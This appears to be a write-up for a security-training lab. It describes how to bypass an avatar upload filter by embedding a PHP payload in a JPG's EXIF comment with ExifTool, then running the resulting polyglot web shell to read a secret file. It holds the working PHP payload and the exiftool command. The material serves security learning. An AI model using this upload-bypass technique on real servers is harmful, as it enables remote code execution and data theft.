# Exploiting Remote Code Execution via Polyglot Web Shell Upload

This guide provides a clear, creative, and organized solution to exploit a **polyglot web shell upload** vulnerability for remote code execution (RCE). The objective is to create a polyglot PHP/JPG file that passes as an image but executes PHP code, upload it as an avatar, and retrieve the contents of Carlos's secret file (`/home/carlos/secret`) to solve the lab.

## Objective
Upload a polyglot PHP/JPG file containing a malicious PHP payload in its metadata, bypass image validation, execute the code to read a sensitive file, and submit the secret.

## Prerequisites
- Burp Suite with Proxy module configured (optional for traffic analysis).
- A user account with access to the avatar upload feature.
- ExifTool installed on your local system (download from the official website if needed).
- A legitimate JPG image file for modification.
- Basic understanding of polyglot files and PHP scripting.

## Background on the Vulnerability
The application validates uploaded avatars as images but does not thoroughly inspect metadata. A **polyglot file** (e.g., a valid JPG with embedded PHP code in its EXIF metadata) can bypass validation while executing as PHP when interpreted by the server, enabling RCE.

## Steps to Solve the Lab

### Step 1: Create the Malicious PHP Script
1. On your local system, create a file named `exploit.php` with the following content:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
2. **Explanation**: This PHP script reads and outputs the contents of the file `/home/carlos/secret`.

### Step 2: Test Avatar Upload Restrictions
1. Log in to your account.
2. Attempt to upload `exploit.php` as your avatar.
3. **Observation**: The server blocks the upload, confirming restrictions on non-image files. Previous bypass techniques (e.g., Content-Type manipulation) fail here.

### Step 3: Create a Polyglot PHP/JPG File
1. Download and install **ExifTool** if not already available.
2. Use ExifTool to embed a modified PHP payload into a legitimate JPG image's metadata:
   ```bash
   exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
   ```
   payload with me :
    ```bash
   exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" Downloads/cybersecurity.jpg -o polyglot.php 
   ```
3. **Explanation**: 
   - The `-Comment` flag injects the PHP payload into the image's EXIF Comment field.
   - The output file `polyglot.php` is a valid JPG but saved with a `.php` extension, creating a polyglot file.
   - Wrapping the output with `START` and `END` markers helps identify the secret in the response.
4. **Observation**: The command generates `polyglot.php`, which functions as both an image and executable PHP.

### Step 4: Upload the Polyglot File
1. Return to the avatar upload functionality in the browser.
2. Upload `polyglot.php` as your avatar.
3. Navigate back to your account page.
4. **Observation**: The upload succeeds, and the polyglot file is treated as an image preview, confirming the bypass.

### Step 5: Execute the Polyglot Web Shell
1. In Burp Suite, go to **Proxy > HTTP history** and locate the `GET /files/avatars/polyglot.php` request (or manually access it in the browser).
2. Use the message editor's search feature (or inspect the response) to find the `START` string within the binary image data.
3. **Observation**: Between `START` and `END`, the response contains Carlos's secret (e.g., `START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END`).

### Step 6: Submit the Secret
1. Extract the secret from the response (e.g., `2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ`).
2. Submit the secret via the lab’s submission mechanism.
3. **Observation**: Submitting the correct secret solves the lab.

### Step 7: Verify Success
1. If the lab does not confirm completion, verify:
   - The polyglot file was created correctly with ExifTool.
   - The upload request targets `/files/avatars/polyglot.php`.
   - The PHP payload syntax and file path `/home/carlos/secret` are accurate.
2. **Observation**: Successful extraction and submission of the secret completes the lab.